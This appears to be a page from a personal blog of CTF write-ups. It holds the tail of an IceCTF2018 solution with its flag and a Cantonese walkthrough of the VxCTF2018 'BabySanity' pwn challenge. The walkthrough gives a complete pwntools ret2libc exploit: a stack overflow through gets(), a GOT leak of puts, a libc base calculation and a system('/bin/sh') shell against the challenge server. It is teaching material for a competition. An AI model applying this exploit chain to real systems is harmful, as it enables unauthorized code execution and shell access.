class="string">"row"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col l6 s12"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h5</span> <span class="attr">class</span>=<span class="string">"white-text"</span>&gt;</span>About Me<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"grey-text text-lighten-4"</span>&gt;</span>I like blogging about images. I hope you join me on my journey of exploring the world with me!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer-copyright"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">            Made with <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"brown-text text-lighten-3"</span> <span class="attr">href</span>=<span class="string">"http://materializecss.com"</span>&gt;</span>Materialize<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"comment-modal"</span> <span class="attr">class</span>=<span class="string">"modal"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"cyan"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-wrapper"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left col s12 m5 l5"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"modal-action modal-close"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"material-icons"</span>&gt;</span>keyboard_backspace<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#!"</span>&gt;</span>Comment<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col s12 m7 l7 hide-on-med-and-down"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"modal-action modal-close comment-send"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">" material-icons"</span>&gt;</span>send<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"comment-form"</span> <span class="attr">action</span>=<span class="string">"/comment"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-field"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">"comment"</span> <span class="attr">class</span>=<span class="string">"materialize-textarea"</span> <span class="attr">length</span>=<span class="string">"500"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"comment"</span>&gt;</span>Comment<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"postId"</span> <span class="attr">id</span>=<span class="string">"postId"</span> <span class="attr">value</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--Import jQuery before materialize.js--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-2.1.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/static/js/materialize.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/static/js/init.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/static/js/main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IceCTF&#123;who_trusts_these_cookies_anyway?&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/09/12/IceCTF2018-History-Of-Computer/" data-id="cjm1zyku8000d1ww5p0awmp7w" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-VxCTF2018-BabySanity" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/12/VxCTF2018-BabySanity/" class="article-date">
  <time datetime="2018-05-11T17:13:16.000Z" itemprop="datePublished">2018-05-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/12/VxCTF2018-BabySanity/">VxCTF2018-BabySanity</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p><a href="sanity">sanity</a><br><a href="libc-2.23.so">libc-2.23.so</a></p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>一見到有個.so 比賽果陣都放棄左了 , 呢題係完左之後2日先做番出黎</p>
<p>首先啦 , 基本動作 checksec先<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:    amd64-64-little</span><br><span class="line">RELRO:   Partial RELRO</span><br><span class="line">Stack:   No canary found</span><br><span class="line">NX:      NX enabled</span><br><span class="line">PIE:     No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
<p>之後扔入IDA睇下個Main先<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [sp+10h] [bp-70h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Sanity Check should be easy"</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Leak-Function-Address"><a href="#Leak-Function-Address" class="headerlink" title="Leak Function Address"></a>Leak Function Address</h3><p>首先試下點樣可以 trigger main行多次先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(<span class="number">0x401000</span>) <span class="comment">#just for fill rdi</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
<p>可以見到已經行左2次 , 咁如果我地將0x401000轉做一個function既地址會點?<br>最終係可以構做到變成puts(gotAddress)<br>例如想leak libc既main 可以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(__libc_start_main_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">有堆亂碼 , 應該係address既hex string黎</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
<p>咁我地試下leak puts既address啦 , 搵offset都方便d<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(puts_addr_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> leaked.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">90afab45ad7f0a</span></span><br><span class="line"><span class="string">Sanity Check should be easy</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
<p>咁個puts address應該係7fad45abaf90 , 但係多左個0a又調轉左喎 , 咁format下佢 , 同埋計番個libc_base先<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'sanity'</span>)</span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x4006a3</span> <span class="comment">#pop rdi;ret;</span></span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>]) <span class="comment">#puts(puts_addr_got)</span></span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">leaked = u64(leaked[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base = leaked - libc_puts_off</span><br><span class="line">info(<span class="string">"Libc base:"</span> + hex(libc_base))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Output:</span></span><br><span class="line"><span class="string">[*] Libc base: 0x7f28573b5900</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure></p>
<p>咁之後就可以慢慢拎番 binsh 既offset 同埋system既offset , 加番libc base , 再做ROP<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_system_off = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_binsh_offset = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br></pre></td></tr></table></figure></p>
<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><ol>
<li><p>Buffer overflow</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern create 200 input</span><br><span class="line">r &lt; input</span><br><span class="line">pattern search</span><br></pre></td></tr></table></figure>
</li>
<li><p>搵ROPgadget (pop rdi; ret;)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary sanity --only &apos;pop|ret&apos;</span><br></pre></td></tr></table></figure>
</li>
<li><p>砌積木</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer + gadget + binsh_addr + system_addr</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="Full-exploit-code"><a href="#Full-exploit-code" class="headerlink" title="Full exploit code"></a>Full exploit code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./sanity")</span></span><br><span class="line">p = remote(<span class="string">"35.185.151.73"</span>,<span class="number">8044</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>) </span><br><span class="line">e = ELF(<span class="string">'./sanity'</span>)</span><br><span class="line"></span><br><span class="line">libc_system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">libc_puts_off = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">libc_binsh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">gadget = <span class="number">0x4006a3</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"libc system offset: "</span> + hex(libc_system_off))</span><br><span class="line">info(<span class="string">"libc /bin/sh offset: "</span> + hex(libc_binsh_offset))</span><br><span class="line">info(<span class="string">"libc puts offset: "</span> + hex(libc_puts_off))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(e.got[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload += p64(e.symbols[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Sanity Check should be easy\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">leaked = u64(leaked[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base_addr = leaked - libc_puts_off</span><br><span class="line"></span><br><span class="line">info(<span class="string">"leaked puts: "</span> + hex(leaked))</span><br><span class="line">info(<span class="string">"libc base: "</span> + hex(libc_base_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(gadget)</span><br><span class="line">payload += p64(libc_base_addr + libc_binsh_offset)</span><br><span class="line">payload += p64(libc_base_addr + libc_system_off)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://catpawn.github.io/2018/05/12/VxCTF2018-BabySanity/" data-id="cjm1zykul000u1ww5zxbbl7xl" class="article-share-link">Teilen</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">weiter &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archiv</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">letzter Beitrag</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/09/14/IceCTF2018-Drumbone/">IceCTF2018-Drumbone</a>
          </li>
        
          <li>
            <a href="/2018/09/14/IceCTF2018-Lost-in-the-forest/">IceCTF2018-Lost-in-the-forest</a>
          </li>
        
          <li>
            <a href="/2018/09/14/IceCTF2018-HardShells/">IceCTF2018-HardShells</a>
          </li>
        
          <li>
            <a href="/2018/09/14/IceCTF2018-Anticaptcha/">IceCTF2018-Anticaptcha</a>
          </li>
        
          <li>
            <a href="/2018/09/14/IceCTF2018-Pokeamango/">IceCTF2018-Pokeamango</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 CatPawn<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>